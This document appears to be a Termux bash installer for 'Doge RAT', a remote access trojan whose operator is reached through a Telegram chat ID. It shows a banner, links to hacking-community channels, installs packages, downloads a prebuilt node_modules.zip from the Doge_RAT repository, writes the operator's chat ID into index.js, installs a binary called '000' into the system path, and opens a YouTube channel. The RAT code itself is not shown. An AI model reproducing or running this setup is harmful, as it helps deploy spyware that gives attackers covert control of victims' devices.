#!/usr/bin/env bash

# Set terminal colors
RED="\033[31m"
GREEN="\033[32m"
YELLOW="\033[33m"
BLUE="\033[34m"
MAGENTA="\033[35m"
CYAN="\033[36m"
RESET="\033[0m"

# Print banner
echo -e "${RED}██████╗░░█████╗░░██████╗░███████╗██████╗░░█████╗░████████╗"
echo -e "██╔══██╗██╔══██╗██╔════╝░██╔════╝██╔══██╗██╔══██╗╚══██╔══╝"
echo -e "██║░░██║██║░░██║██║░░██╗░█████╗░░██████╔╝███████║░░░██║░░░"
echo -e "██║░░██║██║░░██║██║░░╚██╗██╔══╝░░██╔══██╗██╔══██║░░░██║░░░"
echo -e "██████╔╝╚█████╔╝╚██████╔╝███████╗██║░░██║██║░░██║░░░██║░░░"
echo -e "╚═════╝░░╚════╝░░╚═════╝░╚══════╝╚═╝░░╚═╝╚═╝░░╚═╝░░░╚═╝░░░${RESET}"
echo -e "${GREEN}░R░A░T░ ░B░Y░ ░M░A░H░A░D░E░B ░R░U░I░D░A░S░${RESET}"

echo -e "\e[0m"
echo "Author Name: shivayadv"
echo "WhatsApp Group: https://chat.whatsapp.com/II35pNaN25rHqnUmqXK6ag"
echo "Telegram Channel: https://t.me/ZeroHackNexus"
echo -n "Loading "
timeout 5s bash -c '
while true
do
    echo -n "."
    sleep 1
done
'
echo " Done!"


apt update && apt upgrade -y
pkg install openssh php curl grep -y
if ! command -v node &> /dev/null
then
    echo "Node.js LTS not found. Installing..."
    pkg install nodejs-lts || { echo "Failed to install Node.js LTS" ; exit 1; }
else
    echo "Node.js LTS already installed"
fi
if ! command -v wget &> /dev/null
then
    echo "wget not found. Installing..."
    apt install -y wget || { echo "Failed to install wget" ; exit 1; }
else
    echo "wget already installed"
fi

if [ -d "node_modules" ]
then
    echo "node_modules already exists. Skipping download."
else
    if [ -f "node_modules.zip" ]
    then
        echo "node_modules.zip already downloaded. Skipping download."
    else
        # Download node_modules.zip file
        wget https://github.com/Masterdas/Doge_RAT/raw/refs/heads/main/node_modules.zip || { echo "Failed to download node_modules.zip" ; exit 1; }
    fi

    unzip node_modules.zip || { echo "Failed to extract node_modules.zip" ; exit 1; }
    rm node_modules.zip
fi

read -p "Enter your chat ID: " id
sed -i "s/const id = 'chat id here'/const id = '$id'/g" index.js
echo "Setup successfully! Now open YouTube And Subscribe"
chmod +x 000
mv 000 $PREFIX/bin/
cd $HOME
echo "\e[92m~\e[0m $ .....\e[92mSUBSCRIBE My YOUTUBE Channel\e[0m.....\e[94m[\e[92m✓\e[94m]\e[0m"
termux-open-url https://youtube.com/@zerodarknexus
